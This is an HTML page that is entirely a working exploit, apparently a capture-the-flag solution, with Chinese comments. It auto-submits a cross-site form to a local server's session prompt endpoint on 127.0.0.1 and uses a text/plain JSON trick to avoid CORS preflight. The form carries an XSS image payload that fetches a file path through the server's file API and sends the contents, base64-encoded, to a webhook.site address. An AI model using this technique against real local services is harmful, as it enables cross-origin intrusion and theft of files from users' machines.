<!DOCTYPE html>
<html>
<body>
    <script>
        const WEBHOOK = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";
        const TARGET = "http://127.0.0.1:4096/session/default/prompt";

        // CVE-2026-22813: Markdown XSS Payload
        // 这段脚本运行在 localhost 域下，不再受 CORS/PNA 限制
        const xss = `<img src=x onerror="fetch('/file/content?path=/flag').then(r=>r.json()).then(d=>fetch('${WEBHOOK}?f='+btoa(d.content)))">`;

        // 构造完美的 JSON 格式 (利用 dummy 键吸收结尾的 '=')
        const payload = JSON.stringify({
            "prompt": xss,
            "dummy": "
        }).replace(/}$/, ''); // 去掉最后一个括号，让 form 自动补全

        function attack() {
            const f = document.createElement('form');
            f.action = TARGET;
            f.method = 'POST';
            f.enctype = 'text/plain'; // 避免触发预检请求

            const i = document.createElement('input');
            // 提交的内容将是: {"prompt":"...","dummy":"=
            // 服务器端接收到的将是有效的 JSON 片段
            i.name = payload; 
            i.value = '"}'; // 闭合 JSON
            
            f.appendChild(i);
            document.body.appendChild(f);
            f.submit();
        }

        setTimeout(attack, 1000);
    </script>
</body>
</html>
